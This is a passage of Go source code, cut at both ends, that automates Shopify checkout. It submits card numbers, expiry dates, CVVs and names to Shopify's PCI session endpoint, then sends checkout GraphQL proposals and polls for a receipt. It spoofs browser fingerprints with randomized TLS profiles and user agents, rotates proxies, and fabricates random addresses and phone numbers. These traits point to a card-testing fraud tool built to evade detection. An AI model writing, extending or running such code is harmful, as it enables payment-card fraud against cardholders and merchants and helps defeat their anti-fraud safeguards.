// extracting totals from the full body would pick up the buyer's 0.0 instead of
// the seller's actual price. If sellerProposal is absent, fall back to the full body.
func sellerProposalSection(proposalBody string) string {
	idx := strings.Index(proposalBody, `"sellerProposal"`)
	if idx < 0 {
		return proposalBody
	}
	return proposalBody[idx:]
}

func extractRunningTotal(proposalBody string) string {
	re := regexp.MustCompile(`"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(sellerProposalSection(proposalBody))
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCheckoutTotal(proposalBody string) string {
	re := regexp.MustCompile(`"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(sellerProposalSection(proposalBody))
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerTotal(proposalBody string) string {
	re := regexp.MustCompile(`"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(sellerProposalSection(proposalBody))
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerMerchandisePrice(proposalBody string) string {
	re := regexp.MustCompile(`"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCurrency(proposalBody string) string {
	re := regexp.MustCompile(`"presentmentCurrency"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCountry(proposalBody string) string {
	re := regexp.MustCompile(`"buyerIdentity".*?"customer".*?"countryCode"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCurrencyFromHTML(checkoutHTML string) string {
	re1 := regexp.MustCompile(`(?i)currencycode\s*[:=]\s*["']?([A-Za-z]{3})`)
	if m := re1.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return strings.ToUpper(m[1])
	}
	re2 := regexp.MustCompile(`urrencyCode&quot;:&quot;([A-Za-z]{3})`)
	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return strings.ToUpper(m[1])
	}
	return ""
}

func extractCheckoutPriceFromHTML(checkoutHTML string) string {
	re := regexp.MustCompile(`data-checkout-total-price="([^"]+)"`)
	if m := re.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return m[1]
	}
	re2 := regexp.MustCompile(`data-checkout-subtotal-price="([^"]+)"`)
	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return m[1]
	}
	return ""
}

func patchPayload(payload, currency, country string) string {
	if currency != "USD" {
		payload = strings.ReplaceAll(payload, `"currencyCode": "USD"`, `"currencyCode": "`+currency+`"`)
		payload = strings.ReplaceAll(payload, `"presentmentCurrency": "USD"`, `"presentmentCurrency": "`+currency+`"`)
	}
	if country != "US" {
		payload = strings.ReplaceAll(payload, `"countryCode": "US"`, `"countryCode": "`+country+`"`)
		payload = strings.ReplaceAll(payload, `"phoneCountryCode": "US"`, `"phoneCountryCode": "`+country+`"`)
		payload = strings.ReplaceAll(payload, `"shopPayOptInPhone": {"countryCode": "US"}`, `"shopPayOptInPhone": {"countryCode": "`+country+`"}`)
	}
	return payload
}

func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear int, cvv, shopDomain, proxyURL string) (int, string, error) {
	formattedNum := formatCardNumber(cardNumber)
	payload := fmt.Sprintf(`{
  "credit_card": {
    "number": %q,
    "month": %d,
    "year": %d,
    "verification_value": %q,
    "start_month": null,
    "start_year": null,
    "issue_number": "",
    "name": %q
  },
  "payment_session_scope": %q
}`, formattedNum, cardMonth, cardYear, cvv, cardName, shopDomain)

	req, err := fhttp.NewRequest("POST", "https://checkout.pci.shopifyinc.com/sessions", strings.NewReader(payload))
	if err != nil {
		return 0, "", fmt.Errorf("building PCI request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", "https://checkout.pci.shopifyinc.com")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=")
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-storage-access", "active")
	req.Header.Set("shopify-identification-signature", identSig)
	req.Header.Set("user-agent", randomChromeUA())

	var resp *fhttp.Response
	var lastErr error
	for attempt := 0; attempt < 5; attempt++ {
		pciOptions := []tls_client.HttpClientOption{
			tls_client.WithTimeoutSeconds(30),
			tls_client.WithClientProfile(randomTLSProfile()),
		}
		if proxyURL != "" {
			pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
		}
		pciClient, cErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
		if cErr != nil {
			lastErr = cErr
			continue
		}
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		resp, err = doWithRetry(pciClient, req, 1)
		if err == nil {
			break
		}
		lastErr = err
		if attempt < 4 {
			time.Sleep(2 * time.Second)
		}
	}
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(),
			tls_client.WithTimeoutSeconds(30),
			tls_client.WithClientProfile(randomTLSProfile()),
		)
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	_ = lastErr
	if err != nil {
		return 0, "", fmt.Errorf("POST PCI session: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading PCI response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country, email, phone, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": null,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, stableID, variantID, variantID, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", randomChromeUA())
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal: %w", err)
	}
	defer resp.Body.Close()

	body, err := readResponseBody(resp)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func extractQueueToken(proposalJSON string) string {
	re := regexp.MustCompile(`"queueToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalJSON)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country, deliveryHandle, phone, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [{"email": {"consentState": "DECLINED", "value": %q}}],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken, stableID, variantID, variantID, email, email, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)
	if deliveryHandle != "" {
		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
	}

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", randomChromeUA())
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal2: %w", err)
	}
	defer resp.Body.Close()

	body, err := readResponseBody(resp)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

type Address struct {
	FirstName   string
	LastName    string
	Address1    string
	Address2    string
	City        string
	CountryCode string
	ZoneCode    string
	PostalCode  string
	Phone       string
}

type cityTemplate struct {
	City       string
	ZoneCode   string
	PostalCode string
}

var countryCities = map[string][]cityTemplate{
	"US": {
		{"New York", "NY", "10001"}, {"Los Angeles", "CA", "90001"},
		{"Chicago", "IL", "60601"}, {"Houston", "TX", "77001"},
		{"Phoenix", "AZ", "85001"}, {"Philadelphia", "PA", "19101"},
		{"San Diego", "CA", "92101"}, {"Dallas", "TX", "75201"},
		{"San Jose", "CA", "95101"}, {"Austin", "TX", "78701"},
		{"Jacksonville", "FL", "32201"}, {"Columbus", "OH", "43085"},
		{"Indianapolis", "IN", "46201"}, {"Seattle", "WA", "98101"},
		{"Denver", "CO", "80201"}, {"Boston", "MA", "02101"},
		{"Detroit", "MI", "48201"}, {"Nashville", "TN", "37201"},
		{"Portland", "OR", "97201"}, {"Las Vegas", "NV", "89101"},
		{"Milwaukee", "WI", "53201"}, {"Albuquerque", "NM", "87101"},
		{"Tucson", "AZ", "85701"}, {"Fresno", "CA", "93701"},
		{"Sacramento", "CA", "95801"}, {"Kansas City", "MO", "64101"},
		{"Mesa", "AZ", "85201"}, {"Atlanta", "GA", "30301"},
		{"Miami", "FL", "33101"}, {"Minneapolis", "MN", "55401"},
	},
	"CA": {
		{"Toronto", "ON", "M5H 2N2"}, {"Ottawa", "ON", "K1A 0G9"},
		{"Vancouver", "BC", "V6B 1A1"}, {"Montreal", "QC", "H2Z 1A7"},
		{"Calgary", "AB", "T2P 1J9"}, {"Edmonton", "AB", "T5J 1J9"},
		{"Winnipeg", "MB", "R3C 0V8"}, {"Halifax", "NS", "B3J 1S9"},
	},
	"GB": {
		{"London", "ENG", "SW1A 1AA"}, {"Manchester", "ENG", "M1 1AE"},
		{"Birmingham", "ENG", "B1 1AA"}, {"Leeds", "ENG", "LS1 1AA"},
		{"Liverpool", "ENG", "L1 1AA"}, {"Bristol", "ENG", "BS1 1AA"},
		{"Sheffield", "ENG", "S1 1AA"}, {"Edinburgh", "SCT", "EH1 1AA"},
		{"Glasgow", "SCT", "G1 1AA"}, {"Cardiff", "WLS", "CF10 1AA"},
	},
	"AU": {
		{"Sydney", "NSW", "2000"}, {"Melbourne", "VIC", "3000"},
		{"Brisbane", "QLD", "4000"}, {"Perth", "WA", "6000"},
		{"Adelaide", "SA", "5000"}, {"Canberra", "ACT", "2600"},
		{"Hobart", "TAS", "7000"}, {"Darwin", "NT", "0800"},
	},
	"DE": {
		{"Berlin", "BE", "10117"}, {"Hamburg", "HH", "20095"},
		{"Munich", "BY", "80331"}, {"Cologne", "NW", "50667"},
		{"Frankfurt", "HE", "60311"}, {"Stuttgart", "BW", "70173"},
		{"Dusseldorf", "NW", "40210"}, {"Leipzig", "SN", "04109"},
	},
	"FR": {
		{"Paris", "IDF", "75001"}, {"Marseille", "PAC", "13001"},
		{"Lyon", "ARA", "69001"}, {"Toulouse", "OCC", "31000"},
		{"Nice", "PAC", "06000"}, {"Nantes", "PDL", "44000"},
		{"Bordeaux", "NAQ", "33000"}, {"Lille", "HDF", "59000"},
	},
	"NZ": {
		{"Auckland", "AUK", "1010"}, {"Wellington", "WGN", "6011"},
		{"Christchurch", "CAN", "8011"}, {"Hamilton", "WKO", "3204"},
		{"Tauranga", "BOP", "3110"}, {"Dunedin", "OTA", "9016"},
	},
	"IE": {
		{"Dublin", "D", "D02 Y006"}, {"Cork", "C", "T12 X8HR"},
		{"Galway", "G", "H91 X0EE"}, {"Limerick", "LK", "V94 R1X2"},
		{"Waterford", "WD", "X91 Y1A0"}, {"Drogheda", "LD", "A92 R6X2"},
	},
}

var streetNames = []string{
	"Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd",
	"Elm St", "Washington Ave", "Lake Dr", "Hill Rd", "Park Ave",
	"River Rd", "Spring St", "Forest Dr", "Highland Ave", "Sunset Blvd",
	"Church St", "Mill Rd", "Ridge Ave", "Valley Dr", "Meadow Ln",
	"Bay St", "Center St", "Union St", "School St", "Garden Dr",
	"Jefferson St", "Madison Ave", "Lincoln Way", "Jackson St", "Adams St",
}

var phoneAreaCodes = map[string][]string{
	"US": {"212", "312", "347", "415", "510", "617", "646", "713", "718", "786", "818", "832", "917", "949", "954"},
	"CA": {"416", "604", "514", "403", "613", "902", "204", "905"},
	"GB": {"20", "161", "121", "113", "151", "117", "141", "131"},
	"AU": {"2", "3", "7", "8"},
	"DE": {"30", "40", "89", "221", "69", "711", "211", "341"},
	"FR": {"1", "4", "5", "6", "9"},
	"NZ": {"9", "4", "3", "6"},
	"IE": {"1", "21", "91", "61", "51", "1"},
}

func randomPhone(country string) string {
	codes, ok := phoneAreaCodes[country]
	if !ok {
		codes = phoneAreaCodes["US"]
	}
	area := codes[rand.Intn(len(codes))]
	var suffix string
	switch country {
	case "US", "CA":
		suffix = fmt.Sprintf("%03d%04d", rand.Intn(1000), rand.Intn(10000))
		return "+1 " + area + suffix
	case "GB":
		suffix = fmt.Sprintf("%d%06d", rand.Intn(10), rand.Intn(1000000))
		return "+44 " + area + " " + suffix
	case "AU":
		suffix = fmt.Sprintf("%04d%04d", rand.Intn(10000), rand.Intn(10000))
		return "+61 " + area + " " + suffix
	case "DE":
		suffix = fmt.Sprintf("%07d", rand.Intn(10000000))
		return "+49 " + area + " " + suffix
	case "FR":
		suffix = fmt.Sprintf("%02d%02d%02d%02d", rand.Intn(100), rand.Intn(100), rand.Intn(100), rand.Intn(100))
		return "+33 " + area + " " + suffix
	case "NZ":
		suffix = fmt.Sprintf("%03d%04d", rand.Intn(1000), rand.Intn(10000))
		return "+64 " + area + " " + suffix
	case "IE":
		suffix = fmt.Sprintf("%d%06d", rand.Intn(10), rand.Intn(1000000))
		return "+353 " + area + " " + suffix
	default:
		suffix = fmt.Sprintf("%03d%04d", rand.Intn(1000), rand.Intn(10000))
		return "+1 " + area + suffix
	}
}

func addressForCountry(country string) Address {
	cities, ok := countryCities[country]
	if !ok || len(cities) == 0 {
		cities = countryCities["US"]
		country = "US"
	}
	city := cities[rand.Intn(len(cities))]
	streetNum := 1 + rand.Intn(9999)
	street := streetNames[rand.Intn(len(streetNames))]
	return Address{
		Address1:    fmt.Sprintf("%d %s", streetNum, street),
		Address2:    "",
		City:        city.City,
		CountryCode: country,
		ZoneCode:    city.ZoneCode,
		PostalCode:  city.PostalCode,
		Phone:       randomPhone(country),
	}
}

func randomAddress2() string {
	prefixes := []string{"Apt", "Suite", "Unit", "#"}
	p := prefixes[rand.Intn(len(prefixes))]
	return fmt.Sprintf("%s %d", p, 1+rand.Intn(999))
}

func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email string, addr Address, currency, country, deliveryHandle, proxyURL string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": %q,
              "address2": %q,
              "city": %q,
              "countryCode": %q,
              "postalCode": %q,
              "firstName": %q,
              "lastName": %q,
              "zoneCode": %q,
              "phone": %q,
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {"phone": %q}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": %q,
          "address2": %q,
          "city": %q,
          "countryCode": %q,
          "postalCode": %q,
          "firstName": %q,
          "lastName": %q,
          "zoneCode": %q,
          "phone": %q
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [{"email": {"consentState": "DECLINED", "value": %q}}],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		addr.Phone,
		stableID, variantID, variantID,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		email, email, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)
	if deliveryHandle != "" {
		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
	}

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", randomChromeUA())
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal3: %w", err)
	}
	defer resp.Body.Close()

	body, err := readResponseBody(resp)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendPollForReceipt(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	buildID, sourceToken,
	pollID, receiptID, receiptSessionToken string,
	proxyURL string,
) (int, string, error) {

	varsJSON := fmt.Sprintf(`{"receiptId":%s,"sessionToken":%s}`,
		strconv.Quote(receiptID), strconv.Quote(receiptSessionToken))

	graphqlURL := shopURL + "/checkouts/internal/graphql/persisted"

	params := url.Values{}
	params.Set("operationName", "PollForReceipt")
	params.Set("variables", varsJSON)
	params.Set("id", pollID)

	fullURL := graphqlURL + "?" + params.Encode()

	req, err := fhttp.NewRequest("GET", fullURL, nil)
	if err != nil {
		return 0, "", fmt.Errorf("creating PollForReceipt request: %w", err)
	}

	checkoutPath := strings.TrimPrefix(checkoutURL, shopURL)

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
